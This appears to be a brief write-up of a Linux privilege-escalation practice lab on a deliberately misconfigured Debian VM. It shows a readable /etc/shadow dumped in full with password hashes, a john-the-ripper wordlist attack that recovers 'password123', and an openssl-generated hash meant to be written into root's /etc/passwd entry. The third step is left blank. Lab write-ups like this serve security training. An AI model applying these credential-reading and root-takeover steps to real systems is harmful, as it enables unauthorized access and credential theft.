# Linux PrivEsc

## Practice your Linux Privilege Escalation skills on an intentionally misconfigured Debian VM with multiple ways to get root!

1. Typical configuration of /etc/shadow file:
```
$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1395 Nov 17 19:58 /etc/shadow                            
```


/etc/shadow file is readable
```
user@debian:/tmp$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
```
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt /tmp/hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     
1g 0:00:00:01 DONE (2022-11-21 12:48) 0.6944g/s 1066p/s 1066c/s 1066C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

2. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Generate a password hash and write it inside the /etc/passwd root entry:

```
└─$ openssl passwd bellapassword    
$1$GYnznsrb$1nh6QXRI8/xUzuHzWyjUT/
```

![image](https://user-images.githubusercontent.com/62257411/203126354-55067afa-4747-48c0-8478-90fdf6c1fe4b.png)

3. 


